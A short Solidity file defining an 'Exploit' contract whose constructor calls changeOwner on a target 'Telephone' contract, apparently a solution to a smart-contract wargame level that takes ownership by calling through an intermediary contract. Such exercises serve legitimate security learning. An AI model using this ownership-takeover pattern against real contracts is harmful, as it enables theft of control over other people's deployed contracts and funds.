// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "./Telephone.sol";

contract Exploit {
    constructor(Telephone _targetContract, address _newOwner) {
        _targetContract.changeOwner(_newOwner);
    }
}
